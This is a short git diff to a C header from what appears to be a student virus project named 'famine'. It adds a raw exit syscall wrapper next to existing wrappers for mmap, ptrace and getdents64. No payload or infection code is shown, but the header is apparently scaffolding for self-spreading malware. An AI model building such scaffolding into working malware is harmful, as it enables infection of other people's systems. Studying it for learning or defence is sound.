@@ -6,7 +6,7 @@
 /*   By: jfortin <jfortin@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/04 22:22:08 by jfortin           #+#    #+#             */
-/*   Updated: 2019/06/06 23:19:41 by jfortin          ###   ########.fr       */
+/*   Updated: 2019/06/07 03:50:39 by agrumbac         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -21,6 +21,7 @@
 # define SYS_MMAP       9
 # define SYS_MPROTEC    10
 # define SYS_MUNMAP     11
+# define SYS_EXIT	60
 # define SYS_PTRACE     101
 # define SYS_GETDENTS64 217
 # define SYS_OPENAT     257
@@ -83,6 +84,12 @@ inline int	famine_mprotect(_u void *addr, _u size_t len, _u int prot)
 inline int	famine_munmap(_u void *addr, _u size_t length)
 {
 	wrap_syscall(SYS_MUNMAP);
+	__builtin_unreachable();
+}
+
+inline int	famine_exit(_u int status)
+{
+	wrap_syscall(SYS_EXIT);
 	__builtin_unreachable();
 }
 
